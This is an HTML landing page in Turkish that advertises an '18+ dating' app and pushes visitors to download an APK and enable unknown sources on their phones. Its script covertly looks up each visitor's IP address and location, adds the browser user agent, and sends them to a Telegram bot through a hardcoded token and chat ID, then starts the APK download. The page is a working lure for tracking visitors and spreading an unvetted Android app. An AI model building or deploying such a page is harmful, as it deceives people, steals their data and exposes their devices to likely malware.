<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECRET +18 TANISMA</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto+Mono:wght@400;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.88)), 
                        url('https://picsum.photos/id/1015/1920/1080') center/cover no-repeat; /* Burayı değiştireceğiz */
            background-position: center 20%;
            color: #fff;
            font-family: 'Roboto Mono', monospace;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at 50% 35%, rgba(255, 20, 147, 0.45), transparent 70%);
            animation: pulse 8s ease-in-out infinite;
            z-index: 1;
        }

        .container { text-align: center; z-index: 10; position: relative; }

        .title {
            font-family: 'Playfair Display', serif;
            font-size: 5.4rem;
            font-weight: 700;
            background: linear-gradient(90deg, #ff1493, #ff00ff, #ff69b4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 60px #ff1493, 0 0 110px #ff00ff;
            margin: 0 0 15px 0;
            letter-spacing: 4px;
        }

        .subtitle {
            font-size: 1.8rem;
            color: #ffb3d1;
            margin-bottom: 60px;
            text-shadow: 0 0 35px rgba(255, 179, 209, 0.8);
        }

        .highlight { color: #ff1493; font-weight: bold; }

        .download-btn {
            display: inline-block;
            padding: 28px 100px;
            font-size: 2rem;
            font-weight: 700;
            color: #000;
            background: linear-gradient(90deg, #ff1493, #ff00ff);
            border-radius: 60px;
            text-decoration: none;
            box-shadow: 0 0 50px #ff1493, 0 0 100px #ff00ff, inset 0 0 35px rgba(255,255,255,0.8);
            transition: all 0.4s ease;
        }

        .download-btn:hover {
            transform: scale(1.22) translateY(-12px);
            box-shadow: 0 0 90px #ff1493, 0 0 160px #ff00ff;
        }

        .download-btn::after {
            content: '🔥';
            position: absolute;
            right: 35px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 2.4rem;
            animation: fire 1.2s infinite;
        }

        .warning {
            margin-top: 85px;
            color: #ffdd00;
            font-size: 1.25rem;
            text-shadow: 0 0 25px #ffdd00;
        }

        @keyframes pulse { 0%,100% { opacity: 0.65; } 50% { opacity: 1; } }
        @keyframes fire { 0%,100% { transform: translateY(-50%) scale(1); } 50% { transform: translateY(-50%) scale(1.45); } }
    </style>
</head>
<body>

    <div class="container">
        <h1 class="title">SECRET +18</h1>
        <p class="subtitle">
            Gerçek yetişkin tanışma<br>

        </p>
        
        <a href="#" onclick="handleDownload()" class="download-btn">
            APK'YI İNDİR
        </a>

        <p class="warning">
            18+ • İndirdikten sonra bilinmeyen kaynakları aç
        </p>
    </div>

    <script>
        const BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
        const CHAT_ID   = "-1003887845842";

        const APK_URL   = "uygulaman.apk";     // ← Kendi apk dosya adını buraya yaz
        const APK_NAME  = "SecretTanisma18.apk";

        async function sendLog() {
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

            const message = `🔥 *Yeni +18 İndirme!*\n\n` +
                            `🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n` +
                            `🌐 IP: \`${ipData.ip || 'Bilinmiyor'}\`\n` +
                            `📍 Konum: ${ipData.city || ''}, ${ipData.country || ''}\n` +
                            `📱 Cihaz: ${navigator.userAgent}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            }).catch(() => {});
        }

        function handleDownload() {
            sendLog();
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = APK_URL;
                link.download = APK_NAME;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 350);
        }
    </script>
</body>
</html>
